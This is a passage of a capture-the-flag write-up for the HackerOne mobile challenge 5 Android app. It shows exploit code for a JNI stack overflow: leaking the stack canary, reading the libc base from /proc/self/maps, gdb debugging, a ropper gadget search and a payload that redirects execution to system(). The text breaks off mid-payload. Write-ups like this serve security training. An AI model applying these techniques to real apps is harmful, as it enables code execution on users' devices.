+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>
+<span class="token function">Java_com_hackerone_mobilechallenge5_PetHandler_censorDogs</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> <span class="token keyword">int</span> f_arg<span class="token punctuation">,</span> jstring s_arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">int</span> l<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>in_b64_string<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    in_b64_string <span class="token operator">=</span> env<span class="token operator">-&gt;</span><span class="token function">GetStringUTFChars</span><span class="token punctuation">(</span>s_arg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    l <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b64_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    b64_decoded_string <span class="token operator">=</span> <span class="token function">_b64_decode_ex</span><span class="token punctuation">(</span>b64_string<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>b64_decoded_string<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>We know now that the first part decodes the string (which is an attacker-controlled param) and checks that its decoded length is <code>&lt; 0x201</code> (less than 513 bytes) or, to keep it in a <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height: 0.664392em;"></span><span class="strut bottom" style="height: 0.664392em; vertical-align: 0em;"></span><span class="base"><span class="mord"><span class="mord mathrm">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.664392em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathit mtight">n</span></span></span></span></span></span></span></span></span></span></span></span> format, <code>&lt;= 0x200</code> (less or equals to 512 bytes).<br>
+The second part contains juicy code:</p>
+<p><img src="https://i.imgur.com/sfkR0Dc.png" alt=""></p>
+<pre class=" language-c"><code class="prism  language-c">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>b64_decoded_string<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0x201</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+       <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> b64_decoded_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+       <span class="token comment">// -- Here we're again --</span>
+       <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> b64_decoded_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> <span class="token string">"dog"</span><span class="token punctuation">,</span> <span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+       <span class="token function">free</span><span class="token punctuation">(</span>b64_decoded_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Probably you’re asking yourself "what’s <strong>dest</strong> buffer?"<br>
+I’ll tell you: <strong>dest</strong> buffer is a static buffer (512 bytes) declared inside/outside the function body and shared across other functions.</p>
+<p>Every time this function is called it copies the passed data into <strong>dest</strong> buffer and, most important thing, <strong>the function returns some data from memory</strong> - we can call it a <strong>leak</strong> -.</p>
+<pre class=" language-c"><code class="prism  language-c">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment">// The code init a new array and gets a sub range</span>
+    <span class="token comment">// but this is another way to achieve the same result</span>
+    env<span class="token operator">-&gt;</span><span class="token function">GetByteArrayRegion</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> f_arg<span class="token punctuation">,</span> <span class="token operator">&amp;</span>leaked_memory_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> leaked_memory_buffer<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="getmysomething">getMySomething</h3>
+<p>No, I don’t want anything from you, it’s just the name of the last method we’re going to analyze:</p>
+<p><img src="https://i.imgur.com/uUu6q3u.png" alt=""></p>
+<p>Which seems to return the pointer to <strong>dest</strong> buffer where data is copied from <strong>censorDogs</strong> function.</p>
+<h2 id="summing-up">Summing up</h2>
+<p>Before I come to phase II (the real exploitation) I’d like to make a recap of what we’ve to do to achieve our goal:</p>
+<ol>
+<li>Start the app with an <strong>Intent</strong> having an <strong>url</strong> extra set to a controlled domain;</li>
+<li>Leak the stack cookie by calling <strong>censorDogs</strong> JNI method through javascript interface;</li>
+<li>Leak the base address of <strong>libc</strong> which contains the function we’ll use to grab the flag (<strong>system</strong> one);</li>
+<li>Inject the data that will be passed as the argument to the above function;</li>
+<li>Find a <a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">ROP gadget</a>;</li>
+<li>Send the right amount of data to <strong>censorCats</strong> with the <strong>stack cookie</strong> value at the right offset to pass the stack canaries protection and force the code to jump to ROP Gadget address found in step 5.</li>
+</ol>
+<h2 id="phase-ii---exploitation">Phase II - Exploitation</h2>
+<p>Point <strong>1</strong> is pretty simple. All we need to know is the package name (<em>com.hackerone.mobile.challenge5</em>) of the app we’re going to launch.</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">runChallengeApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">startActivity</span><span class="token punctuation">(</span>
+            <span class="token function">getPackageManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">getLaunchIntentForPackage</span><span class="token punctuation">(</span><span class="token string">"com.hackerone.mobile.challenge5"</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"https://mydomain.tld/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Since I’m a CE (Computer Engineer) student and this year I attended an OS course I know a bit more about Linux. Probably the way we should follow to get the <strong>libc</strong> base address involves digging into leaked data but I know a better method (as we’ll install the app and not trig the exploit remotely). Every info you need about loaded libraries can be found inside <strong>/proc/self/maps</strong>.</p>
+<p>We can join points <strong>1</strong> and <strong>3</strong>. The result is a more controllable exploit and a higher percentage of success.</p>
+<pre class=" language-java"><code class="prism  language-java">  <span class="token keyword">private</span> <span class="token keyword">long</span> <span class="token function">getLibraryBaseAddress</span><span class="token punctuation">(</span>String lib<span class="token punctuation">)</span><span class="token punctuation">{</span>
+      Scanner scanner <span class="token operator">=</span> null<span class="token punctuation">;</span>
+
+      <span class="token keyword">try</span> <span class="token punctuation">{</span>
+          scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>
+              <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>
+          <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+          <span class="token keyword">while</span> <span class="token punctuation">(</span>scanner<span class="token punctuation">.</span><span class="token function">hasNextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+              String line <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                      <span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+              <span class="token comment">// Look for library and 'x'ecution flag  </span>
+              <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>lib<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"xp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                  String<span class="token punctuation">[</span><span class="token punctuation">]</span> components <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                  <span class="token keyword">return</span> Long<span class="token punctuation">.</span><span class="token function">parseLong</span><span class="token punctuation">(</span>components<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+              <span class="token punctuation">}</span>
+          <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>scanner <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+              scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span>
+
+      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">runChallengeApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">startActivity</span><span class="token punctuation">(</span>
+          <span class="token function">getPackageManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+              <span class="token punctuation">.</span><span class="token function">getLaunchIntentForPackage</span><span class="token punctuation">(</span><span class="token string">"com.hackerone.mobile.challenge5"</span><span class="token punctuation">)</span>
+              <span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>
+                <span class="token string">"https://mydomain.tld/?%d"</span><span class="token punctuation">,</span>
+                <span class="token function">getLibraryBaseAddress</span><span class="token punctuation">(</span><span class="token string">"/system/lib64/libc.so"</span><span class="token punctuation">)</span>
+              <span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+</code></pre>
+<p>Enough with Java. Time for javascript! As said, this part must be coded in javascript as we’ll invoke Java functions through javascript interface (<strong>PetHandler</strong>).</p>
+<h3 id="long-life-to-gdb">Long life to GDB</h3>
+<p>Until now I’ve mainly used two tools: <strong>IDA</strong> and <strong>jadx</strong>. We need to add another one to our toolkit: <a href="https://www.gnu.org/software/gdb/">GDB</a>. It’ll help us to step into code while executing it. Basically, we’re switching from static to dynamic analysis but don’t be afraid nor scared, you’ve just to follow (the white rabbit 💊) me. The emulator comes with <strong>gdbserver64</strong> and the <strong>NDK</strong> toolkit contains the <strong>gdb</strong> we need under <strong>NDKPATH/ndk-bundle/prebuilt/darwin-x86_64/bin</strong>.</p>
+<p>You can download the right version for your OS <a href="https://developer.android.com/ndk/downloads/">here</a>.</p>
+<p>We even need a running local web server. In its root, we’ll put the page with our javascript code used to invoke the function/s.</p>
+<pre class=" language-html"><code class="prism  language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+            window<span class="token punctuation">.</span><span class="token function">addEvenListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+                cmd<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">var</span> leak <span class="token operator">=</span> PetHandler<span class="token punctuation">.</span><span class="token function">censorMyDogs</span><span class="token punctuation">(</span>
+                      <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token comment">// Max size of returned leak data</span>
+                      <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token string">'dummy data'</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">)</span>
+               <span class="token punctuation">}</span><span class="token punctuation">)</span>
+           <span class="token punctuation">}</span><span class="token punctuation">)</span>
+       </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cmd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Censor my dogs<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<p>If you don’t know how to start a web server you can try the <a href="https://twitter.com/jobertabma/status/1009460168067723265">Jobert Abma</a>’s way 😜:</p>
+<pre class=" language-php"><code class="prism  language-php">$ <span class="token function">cd</span> /root/path/of/http/server
+$ <span class="token function">php</span> <span class="token operator">-</span>S <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token punctuation">:</span>port
+</code></pre>
+<p>Assuming the emulator is running and we’ve built and installed a custom app (I suggest you to grab <a href="https://developer.android.com/studio/">Android Studio</a> for this task) with the above Java chunk pointing to the local web server we can launch the following commands:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token function">adb</span> forward tcp:23946 tcp:23946
+$ <span class="token function">adb</span> shell
+$ <span class="token function">su</span>
+$ <span class="token function">gdbserver64</span> localhost:23946 --attach <span class="token punctuation">$(</span><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/[c]om.hackerone.mobile.challenge5/{print <span class="token variable">$2</span>}'</span><span class="token punctuation">)</span>
+</code></pre>
+<p>And from the host:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token function">gdb</span> /path/of/challenge5/libs/x86_64/libnative-lib.so
+GNU gdb <span class="token punctuation">(</span>GDB<span class="token punctuation">)</span> 7.11
+<span class="token punctuation">..</span>.
+Reading symbols from libnative-lib.so<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
+</code></pre>
+<p>Once done we can attach to our remote gdb listener and collect some info:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">target</span> remote :23946
+<span class="token punctuation">..</span>.
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">layout</span> asm
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">layout</span> regs
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">info</span> functions censorDogs
+0x0000000000001270  Java_com_hackerone_mobile_challenge5_PetHandler_censorDogs
+0x00007c1e2e78d160  com.hackerone.mobile.challenge5.PetHandler.censorDogs
+0x00007c1e2e661270  Java_com_hackerone_mobile_challenge5_PetHandler_censorDogs
+</code></pre>
+<p>We now have a wonderful view of asm and registers and we even know the address of <strong>Java_com_hackerone_mobile_challenge5_PetHandler_censorDogs</strong>.</p>
+<p>We’ve just to set a breakpoint on it and resume the execution:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">break</span> *0x00007c1e2e661270
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">continue</span>
+</code></pre>
+<p>Our web page will be shown into hackerone’s mobile app and it’s time to push the button! gdb will hang when the address is reached letting us step line by line using <code>si</code> or <code>ni</code> commands.</p>
+<pre class=" language-bash"><code class="prism  language-bash">0x7c1e2e661270 <span class="token operator">&lt;</span>Java_com_~<span class="token operator">&gt;</span>     push   %rbp
+0x7c1e2e661271 <span class="token operator">&lt;</span>Java_com_~+1<span class="token operator">&gt;</span>   push   %r15
+0x7c1e2e661273 <span class="token operator">&lt;</span>Java_com_~+3<span class="token operator">&gt;</span>   push   %r14
+0x7c1e2e661275 <span class="token operator">&lt;</span>Java_com_~+5<span class="token operator">&gt;</span>   push   %rbx
+0x7c1e2e661276 <span class="token operator">&lt;</span>Java_com_~+6<span class="token operator">&gt;</span>   sub    <span class="token variable">$0x408</span>,%rsp
+0x7c1e2e66127d <span class="token operator">&lt;</span>Java_com_~+13<span class="token operator">&gt;</span>  mov    %edx,%r14d
+0x7c1e2e661280 <span class="token operator">&lt;</span>Java_com_~+16<span class="token operator">&gt;</span>  mov    %rdi,%rbx
+0x7c1e2e661283 <span class="token operator">&lt;</span>Java_com_~+19<span class="token operator">&gt;</span>  mov    %fs:0x28,%rax    <span class="token operator">&lt;</span>--- rax contains our stack cookie
+0x7c1e2e66128c <span class="token operator">&lt;</span>Java_com_~+28<span class="token operator">&gt;</span>  mov    %rax,0x400<span class="token punctuation">(</span>%rsp<span class="token punctuation">)</span>
+
+-----
+
+rax            0xa1d20cf7896c32ce
+rcx            0x7c1e2affdd88
+rsi            0x7c1e2affdd84
+rbp            0x7c1e2affde18
+r8             0x7c1e2affe178
+r10            0x7c1e2e8cc049
+</code></pre>
+<p>You’ve to reach the marked line. In my case the stack cookie is <code>0xa1d20cf7896c32ce</code>. Why do we need to know its value? 'Cause we must locate it in returned leaked data!</p>
+<p>The first argument of <code>PetHandler.censorMyDogs</code> function is <code>1024</code> meaning that we want 1024 bytes back. Let’s use math:</p>
+<p><code>1024 (size of leaked data in bytes) / 8 (size of a DWORD in bytes) = 128 total DWORDs</code></p>
+<p>Don’t forget the <a href="https://en.wikipedia.org/wiki/Endianness">endianness</a> . We’re dealing with Little-Endian so our entries “must be reversed” (please, don’t kill me). The following example will clarify:</p>
+<pre class=" language-javascript"><code class="prism  language-javascript">    leak <span class="token operator">=</span> <span class="token punctuation">[</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
+        <span class="token operator">...</span>
+        <span class="token number">0xce</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span> <span class="token number">0xa1</span>
+        <span class="token operator">...</span>
+    <span class="token punctuation">]</span>
+</code></pre>
+<p>The cookie is here, indeed. If you try to run the code again, again and again, you’ll notice that the 🍪 starts alway at offset <code>0x400</code> in <strong>leak</strong> array.</p>
+<h3 id="approaching-cats-in-a-different-way">Approaching cats in a different way</h3>
+<p>Instead of dynamic analysis, I’d like to approach the exploitation of <strong>censorCats</strong> with pure math.</p>
+<p><img src="https://i.imgur.com/8ZgUyaq.png" alt=""></p>
+<p>From the code above we know that the reserved stack size for this function is <code>0x210</code> (bytes), <code>rcx</code> contains the 🍪 which is saved at <code>rsp+0x228-0x20</code> and the <strong>memcpy</strong> copies <code>0x230</code> bytes.</p>
+<p><code>0x228 - 0x20 = 0x208</code>: where our 🍪 should reside in passed data;<br>
+<code>0x230 - 0x208 = 0x28</code>: 4 more dwords we’ve control of (40 bytes total).</p>
+<p>If you think my math is wrong try by yourself using gdb 😬.</p>
+<p>As said, we can control 4 dwords at the end of the stack which will be respectively popped in <code>rbx</code>, <code>r14</code>, <code>r15</code> and used for <code>retn</code> address.</p>
+<p>Our temporary payload will look like:</p>
+<pre class=" language-javascript"><code class="prism  language-javascript">    payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
+        <span class="token operator">...</span>
+        cookie<span class="token punctuation">,</span>                                            <span class="token comment">// @ offset 0x208</span>
+        systemFunctionAddress<span class="token punctuation">,</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>    <span class="token comment">// don't care about rsi</span>
+        getMySomethingValue<span class="token punctuation">,</span>                               <span class="token comment">// rdi</span>
+        <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span>
+    <span class="token punctuation">]</span>
+</code></pre>
+<h3 id="rop-gadged---musical_note-its-the-g-a-d-to-the-g-e-t-musical_note">ROP Gadged - 🎵 Its the g-a-d to the g-e-t 🎵</h3>
+<p>The <strong>5th</strong> point or our checklist requires to locate a ROP Gadged. There’re a lot of tools out there but I suggest you use <a href="https://scoding.de/ropper/">ropper</a>. Since last three instructions of <strong>censorCats</strong> are:</p>
+<pre class=" language-asm"><code class="prism  language-asm">   pop rbx,
+   pop r14,
+   pop r15,
+   retn
+</code></pre>
+<p>I need to locate somewhere a <code>mov rdi, r[bx|14|15]</code> followed by a <code>jmp r[bx|14|15]</code>.</p>
+<p>This part took me some hour until I realized I was searching in the wrong library 🙈.</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token function">adb</span> pull /system/lib64/libc.so /tmp/libc.so
+$ <span class="token function">ropper2</span> --file /tmp/libc.so --search <span class="token string">"mov rdi, r1?"</span>
+<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Load gadgets from cache
+<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> loading<span class="token punctuation">..</span>. 100%
+<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> removing double gadgets<span class="token punctuation">..</span>. 100%
+<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span>  Searching <span class="token keyword">for</span> gadgets: mov rdi, r1?
+
+<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span>  File: /tmp/libc.so
+0x0000000000028bea: mov  rdi, r12<span class="token punctuation">;</span> mov  rdx, r15<span class="token punctuation">;</span> call  qword ptr <span class="token punctuation">[</span>rax + 0x20<span class="token punctuation">]</span><span class="token punctuation">;</span>
+0x00000000000a2daf: mov  rdi, r12<span class="token punctuation">;</span> mov  rsi, r15<span class="token punctuation">;</span> mov  rdx, r14<span class="token punctuation">;</span> mov  rcx, r13<span class="token punctuation">;</span> call  qword ptr <span class="token punctuation">[</span>rbx + 0x20<span class="token punctuation">]</span><span class="token punctuation">;</span>
+0x00000000000a2c09: mov  rdi, r13<span class="token punctuation">;</span> mov  rsi, r14<span class="token punctuation">;</span> call  rax<span class="token punctuation">;</span>
+0x0000000000027bee: mov  rdi, r14<span class="token punctuation">;</span> call  qword ptr <span class="token punctuation">[</span>rax + 0x38<span class="token punctuation">]</span><span class="token punctuation">;</span>
+0x000000000002af19: mov  rdi, r14<span class="token punctuation">;</span> call  rbx<span class="token punctuation">;</span>
+0x00000000000c2273: mov  rdi, r14<span class="token punctuation">;</span> mov  rdx, r10<span class="token punctuation">;</span> call  0xc0820<span class="token punctuation">;</span> xor  edi, edi<span class="token punctuation">;</span> mov  rsi, r14<span class="token punctuation">;</span> call  rbx<span class="token punctuation">;</span>
+0x00000000000c217e: mov  rdi, r14<span class="token punctuation">;</span> mov  rsi, r15<span class="token punctuation">;</span> call  rbx<span class="token punctuation">;</span>
+0x00000000000c2176: mov  rdi, r15<span class="token punctuation">;</span> call  0xc0820<span class="token punctuation">;</span> mov  rdi, r14<span class="token punctuation">;</span> mov  rsi, r15<span class="token punctuation">;</span> call  rbx<span class="token punctuation">;</span>
+0x0000000000027ff8: mov  rdi, r15<span class="token punctuation">;</span> call  qword ptr <span class="token punctuation">[</span>rax + 0x38<span class="token punctuation">]</span><span class="token punctuation">;</span>
+0x00000000000a2644: mov  rdi, r15<span class="token punctuation">;</span> mov  rdx, r14<span class="token punctuation">;</span> call  rax<span class="token punctuation">;</span>
+0x00000000000a2a42: mov  rdi, r15<span class="token punctuation">;</span> mov  rsi, qword ptr <span class="token punctuation">[</span>rsp + 0x128<span class="token punctuation">]</span><span class="token punctuation">;</span> mov  rcx, rsi<span class="token punctuation">;</span> call  qword ptr <span class="token punctuation">[</span>rbp + 0x20<span class="token punctuation">]</span><span class="token punctuation">;</span>
+0x00000000000a353b: mov  rdi, r15<span class="token punctuation">;</span> mov  rsi, r13<span class="token punctuation">;</span> mov  rdx, rbx<span class="token punctuation">;</span> call  qword ptr <span class="token punctuation">[</span>rbp + 8<span class="token punctuation">]</span><span class="token punctuation">;</span>
+0x000000000007cd40: mov  rdi, r15<span class="token punctuation">;</span> mov  rsi, rbp<span class="token punctuation">;</span> call  rbx<span class="token punctuation">;</span>
+</code></pre>
+<p>Can you spot it?</p>
+<pre class=" language-bash"><code class="prism  language-bash">0x00000000000c217e: mov rdi, r14<span class="token punctuation">;</span> mov rsi, r15<span class="token punctuation">;</span> call rbx<span class="token punctuation">;</span>
+</code></pre>
+<p>This means that the final payload will be:</p>
+<pre class=" language-javascript"><code class="prism  language-javascript">    payload <span class="token operator">=</span> <span class="token punctuation">[</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
